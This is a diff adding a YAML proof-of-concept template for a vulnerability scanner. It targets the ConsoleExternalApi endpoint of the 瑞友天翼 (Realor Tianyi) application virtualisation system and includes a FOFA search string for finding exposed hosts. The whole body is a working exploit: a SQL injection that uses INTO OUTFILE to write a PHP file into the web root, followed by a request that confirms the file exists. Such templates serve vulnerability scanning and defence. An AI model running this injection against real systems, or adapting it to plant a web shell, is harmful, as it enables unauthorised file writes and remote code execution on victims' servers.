@@ -1,0 +1,25 @@
+id: poc-yaml-gwt-system-consoleexternalapi-xgi-rce
+info:
+  name: 瑞友天翼应用虚拟化系统 ConsoleExternalApi sql注入任意写入漏洞
+  severity: critical
+  tags:
+  - 任意写入
+  finger: 瑞友天翼应用虚拟化系统
+  fofa: body="/CasMain.XGI"
+variables:
+  filename: to_lower(random_str(10))
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde
+  headers:
+    Content-Type: application/json
+  data: "{\n \"account\": \"1' union select '<?php echo(md5(\\\"{{.t1}}\\\"));unlink(__FILE__);?>',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL\
+    \ into outfile '..\\\\\\\\..\\\\\\\\WebRoot\\\\\\\\{{.filename}}.xgi'#\",\n \"\
+    userPwd\": \"1\"\n}"
+  expression: "status_code == 200 && \ncontains(body,\"\\\"result\\\":0\")\n"
+- method: GET
+  path: /{{.filename}}.xgi
+  expression: "status_code == 200 && \ncontains(body,t2)\n"
+transport: http
